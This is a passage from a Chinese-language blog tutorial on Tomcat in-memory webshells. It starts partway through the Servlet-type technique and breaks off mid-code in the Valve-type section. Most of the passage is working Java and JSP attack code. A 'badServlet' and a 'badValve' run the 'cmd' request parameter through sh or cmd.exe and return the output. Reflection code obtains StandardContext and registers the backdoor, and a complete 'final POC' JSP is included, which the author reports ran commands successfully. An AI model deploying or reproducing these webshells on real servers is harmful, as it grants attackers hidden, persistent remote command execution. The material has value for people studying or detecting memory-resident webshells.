<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903201855849.png" alt="image-20240903201855849"></p>
<p>跟进一下getServletMappings()方法，返回了关键字servletMappings：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903203725059.png" alt="image-20240903203725059"></p>
<p>搜一下这个关键字，可以看到一个非常有用的信息：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903203804191.png" alt="image-20240903203804191"></p>
<p>这里也有getValue()等函数，</p>
<p>所以可以很清楚地知道前面的for循环就是遍历web.xml中的servlet-mapping的servlet-name和对应的url-pattern，然后调用addServletMappingDecode()方法形成映射。</p>
<p>——————</p>
<p>大概分析完毕，现在就是来尝试构造一下POC。</p>
<p>总结一下在这一板块遇到的知识点：</p>
<ul>
<li>可以借鉴这里源码的方法，使用createWrapper()方法来创建一个Wrapper实例</li>
<li>然后再对其使用各种方法来“充实”里面的变量以达到在加载时可以调用出恶意Servlet</li>
</ul>
<h6 id="注入过程-1"><a href="#注入过程-1" class="headerlink" title="注入过程"></a>注入过程</h6><p><strong>恶意Servlet源码</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Servlet</span> <span class="variable">badServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>()&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;servlet启动&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">            out.println(output);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<p><strong>获取StandardContext对象</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span>  <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field0</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)field0.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)field1.get(applicationContext);</span><br></pre></td></tr></table></figure>

<p><strong>创建Wrapper</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//预设置Servlet名称</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>; <span class="comment">//名称随便</span></span><br><span class="line"><span class="comment">//获取StandardWrapper</span></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper)standardContext.createWrapper();</span><br><span class="line"><span class="comment">//相关配置</span></span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//wrapper.setServletClass(name); //有无无所谓</span></span><br><span class="line">    wrapper.setServlet(badServlet); <span class="comment">//重点设置为Wrapper点在这里</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将其加入到当前环境的StandardContext中</span></span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/servlet&quot;</span>,name);</span><br></pre></td></tr></table></figure>

<h6 id="最终POC-2"><a href="#最终POC-2" class="headerlink" title="最终POC"></a>最终POC</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">badServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>()&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;servlet启动&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">            out.println(output);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">ServletContext</span>  <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field0</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)field0.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)field1.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">//预设置Servlet名称</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> badServlet.getClass().getName(); <span class="comment">//名称随便</span></span><br><span class="line"><span class="comment">//获取StandardWrapper</span></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper)standardContext.createWrapper();</span><br><span class="line"><span class="comment">//相关配置</span></span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//wrapper.setServletClass(name); //有无无所谓</span></span><br><span class="line">    wrapper.setServlet(badServlet); <span class="comment">//重点设置为Wrapper点在这里</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将其加入到当前环境的StandardContext中</span></span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/servlet&quot;</span>,name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>开启服务器后还是同样的操作执行一遍即可，成功命令执行：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903222118658.png" alt="image-20240903222118658"></p>
<h4 id="Valve-型内存马"><a href="#Valve-型内存马" class="headerlink" title="Valve 型内存马"></a>Valve 型内存马</h4><p>在Tomcat中定义了两个接口，分别是Pipeline和Valve。Valve可以理解为Pipeline的基本单位，用于处理传入请求和传出请求。</p>
<p>Tomcat的管道机制是指在处理HTTP请求时，将一系列的Valve按顺序链接在一起形成一个处理管道。每个Valve负责在请求处理过程中执行特定的任务，例如认证、日志记录、安全性检查等。这样，请求就会在管道中依次经过每个Valve，每个Valve都可以对请求进行处理或者传递给下一个Valve</p>
<p><strong>Tomcat每个层级的容器（Engine、Host、Context、Wrapper）都有相对应的实现Valve对象（StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve）</strong>，这些Valve同时维护一个Pipeline实例（StandardPipeline）。在每个层级容器中的管道中都有至少有一个Valve，称之为基础阀，其作用是连接当前容器的下一个容器。</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240904143403453.png" alt="image-20240904143403453"></p>
<p>看Valve接口的定义：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Valve</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取下一个Valve，null代表最后一个</span></span><br><span class="line">    Valve <span class="title function_">getNext</span><span class="params">()</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//设置下一个Valve</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve valve)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">backgroundProcess</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行对应请求处理逻辑</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Tomcat中的Valve实现类是ValveBase抽象类，其实现了大部分Valve接口的基本方法，只需要重写invoke()方法。</p>
<p>而看Pipeline接口的实现类StandardPipeline，其定义有addValve()方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240904150212982.png" alt="image-20240904150212982"></p>
<p>而在前面说过，Container的四个容器都是有其相对应的Valve的，看了一下，<strong>四个容器的实现类StandardEngine、StandardHost等都是继承于ContainerBase类的，并且这个ContainerBase类中有addValve()方法</strong>：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240904150639229.png" alt="image-20240904150639229"></p>
<p>其实也就是调用的StandardPipeline类的addValve()方法：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240904150715679.png" alt="image-20240904150715679"></p>
<p>————</p>
<p>现在就可以尝试来直接构造了，过程：</p>
<ul>
<li>反射从HttpRequestServlet 获取 Request</li>
<li>反射从 Request 获取StandardContext</li>
<li>获取到了StandardContext就可以尝试直接向里面添加恶意Valve了。</li>
</ul>
<p>获取StandardContext等四个容器对象都可以：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"><span class="comment">//    StandardHost standardHost = (StandardHost) request1.getHost();</span></span><br><span class="line"><span class="comment">//    StandardWrapper standardWrapper = (StandardWrapper) request1.getWrapper();</span></span><br></pre></td></tr></table></figure>

<p>但我是tomcat9，应该是用不了这个，还是回到之前那个获取StandardContext()方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field0</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)field0.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)field1.get(applicationContext);</span><br></pre></td></tr></table></figure>



<p>定义恶意Valve：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ValveBase</span> <span class="variable">badValve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request req, Response resp)</span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> isLinux ? (Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream()) : (Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream());</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    resp.getWriter().write(o);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">this</span>.getNext().invoke(req, resp);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<p>然后直接加入即可：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field0</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)field0.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)field1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">ValveBase</span> <span class="variable">badValve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request req, Response resp)</span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> isLinux ? (Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream()) : (Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream());</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    resp.getWriter().write(o);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">this</span>.getNext().invoke(req, resp);</span><br><span class="line">            &#125; <span 